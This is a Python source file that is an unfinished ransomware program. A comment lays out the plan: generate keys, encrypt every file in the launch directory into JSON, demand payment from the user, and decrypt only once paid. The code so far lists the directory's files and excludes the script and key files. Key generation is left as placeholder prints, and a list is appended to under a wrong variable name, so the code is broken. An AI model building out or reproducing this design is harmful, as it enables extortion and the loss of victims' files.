import os
from pathlib import Path # home dir: str(Path.home())
import cnsts

#TODO: so now we make the malware, so here is how it is gona work
# what we do is when the program is run, it checks a dir for the keys(probs wana make this global.) (you can use os.getcwd() and os.chdir() for this)
# if they dont exsist, we make them.
# then we load the keys into memory,
# now we need to get info on the current working dir for all of the files in it. (no sub dirs. and exclide the malware executable, use os.listdir() and os.path.isfile() for this)
# use the info to turn each one into a JSON file with the encrypted data.(also just for kicks we are going to log the json file info where the keys are.)
# we tell the user that something bad happend and that they need to pay us moneh.
# at this point the malware goes into moneh collect mode where it asks the user to pay off a debit to goto the next part.
# when it is all paid off then we get all of the JSON files we made and decrypt them, saving each one to the working dir.
# then we are done.
def main():
	homeDir = str(Path.home()) # ima save the keys here. and the save data(basically a record of all the locations of the encrypted files.)
	activeDir = os.getcwd() # this value starts off in the dir where the exe was launched.

	os.chdir(homeDir)
	if(not os.path.isfile(cnsts.kPrv)):
		print('')# generate a key
	elif(not os.path.isfile(cnsts.kPub)):
		print('')# create the public key, also check if the private key is valid.

	os.chdir(activeDir)

	filez=[]
	for i in os.listdir():
			if(os.path.isfile(i)):
				a.append(i)
	# this makes sure to omit the running script or executable from the list of stuff.
	try: filez.remove(__file__)
	except: print('')
	try: filez.remove(cnsts.kPrv)
	except: print('')
	try: filez.remove(cnsts.kPub)
	except: print('')
	
main()
